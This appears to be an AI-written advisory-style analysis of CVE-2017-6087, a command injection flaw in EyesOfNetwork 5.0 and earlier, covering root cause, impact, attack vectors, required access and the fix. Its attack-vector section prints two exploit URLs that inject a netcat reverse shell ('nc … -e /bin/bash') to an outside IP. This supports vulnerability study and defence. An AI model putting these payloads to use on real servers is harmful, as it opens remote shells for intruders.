Based on the provided information, here's an analysis of CVE-2017-6087:

**Root Cause of Vulnerability:**

The root cause of this vulnerability lies in the insufficient filtering of user-supplied input within the EyesOfNetwork (EON) web application. Specifically, the application fails to sanitize the `selected_events` and `module` parameters before using them in shell execution functions (`shell_exec` and `exec`).

**Weaknesses/Vulnerabilities Present:**

*   **Command Injection (CWE-78):** The primary vulnerability is command injection. By crafting malicious payloads within the `selected_events` or `module` parameters, attackers can execute arbitrary system commands on the server hosting the EON application.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** Successful exploitation allows an attacker to achieve remote code execution on the server. This can lead to:
    *   Complete compromise of the server.
    *   Data breaches, data manipulation, or data loss.
    *   Malware installation.
    *   Use of the compromised server to launch attacks on other systems.

**Attack Vectors:**

*   **HTTP GET Requests:** The attack vectors are HTTP GET requests to the EON web application. The vulnerability can be triggered by sending malicious payloads in the `selected_events` parameter to `module/monitoring_ged/ged_actions.php` or the `module` parameter to `module/index.php`.
    *   `https://eonweb.local/module/monitoring_ged/ged_actions.php?queue=history&action=confirm&global_action=4&selected_events[]=;nc%2010.0.5.124%201337%20-e%20/bin/bash;`
    *   `https://eonweb.local/module/index.php?module=|nc%20192.168.1.14%201337%20-e%20/bin/bash&link=padding`

**Required Attacker Capabilities/Position:**

*   **Authenticated User:** The attacker needs to be an authenticated user of the EON web application to exploit the `selected_events` parameter vulnerability in `ged_actions.php`. However, the vulnerability in `index.php` regarding the `module` parameter could potentially be exploited without authentication, although the provided information doesn't explicitly state that.
*   **Network Access:** The attacker needs network access to reach the vulnerable EON web server.

**Additional Notes:**

*   The vulnerability exists in EON version 5.0 and earlier.
*   The fix was introduced in version 5.1, which includes input sanitization.
*   The provided commit log shows that the fix involved the use of prepared statements and parameterized queries in various parts of the application to prevent SQL injection vulnerabilities, as well as sanitizing input passed to shell execution functions.
*   The exploit-db content confirms the findings in the openwall content.
